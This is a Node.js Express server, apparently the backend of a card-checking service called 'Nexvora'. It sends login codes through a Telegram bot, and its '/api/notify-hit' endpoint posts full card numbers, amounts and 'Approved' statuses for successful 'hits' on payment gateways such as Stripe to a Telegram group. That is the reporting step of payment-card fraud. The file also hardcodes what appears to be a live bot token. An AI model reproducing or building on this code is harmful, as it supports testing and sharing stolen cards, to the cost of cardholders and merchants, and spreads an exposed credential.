const express = require('express');
const axios = require('axios');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Security: Use environment variable or fallback to provided token
const BOT_TOKEN = process.env.BOT_TOKEN || '8611283068:AAHACBysrkkm8RqmsidZ24QRwAIcnld4t8o';

app.use(cors());
app.use(express.json());

// Health check
app.get('/', (req, res) => {
    res.send('Nexvora Auth Server is running.');
});

// Endpoint to send OTP
app.post('/api/send-otp', async (req, res) => {
    const { chat_id, otp } = req.body;

    if (!chat_id || !otp) {
        return res.status(400).json({ ok: false, description: 'Missing Chat ID or OTP' });
    }

    try {
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const response = await axios.post(telegramUrl, {
            chat_id: chat_id,
            text: `🔐 *Nexvora Login OTP*\n\nYour login code is: *${otp}*\n\nDo not share this code with anyone.`,
            parse_mode: 'Markdown'
        });

        if (response.data.ok) {
            res.json({ ok: true });
        } else {
            res.status(400).json({ ok: false, description: response.data.description });
        }
    } catch (error) {
        console.error('Telegram API Error:', error.response ? error.response.data : error.message);
        res.status(500).json({ ok: false, description: 'Failed to communicate with Telegram' });
    }
});

// Endpoint to send Hit Notification to Group
app.post('/api/notify-hit', async (req, res) => {
    const { card, amount, gateway, status, user_chat_id } = req.body;
    const GROUP_ID = '-1003721268860'; // User provided Group ID

    try {
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        // Format the message with a professional look
        const message = `🚀 *New Successful Hit!* 🚀\n\n` +
                        `💳 *Card:* \`${card || 'N/A'}\`\n` +
                        `💰 *Amount:* \`${amount || 'N/A'}\`\n` +
                        `🔌 *Gateway:* \`${gateway || 'Stripe'}\`\n` +
                        `✅ *Status:* ${status || 'Approved'}\n\n` +
                        `👤 *User Chat ID:* \`${user_chat_id || 'Unknown'}\`\n` +
                        `✨ *Powered by Nexvora*`;

        await axios.post(telegramUrl, {
            chat_id: GROUP_ID,
            text: message,
            parse_mode: 'Markdown'
        });

        res.json({ ok: true });
    } catch (error) {
        console.error('Group Notification Error:', error.response ? error.response.data : error.message);
        res.status(500).json({ ok: false, description: 'Failed to send group notification' });
    }
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
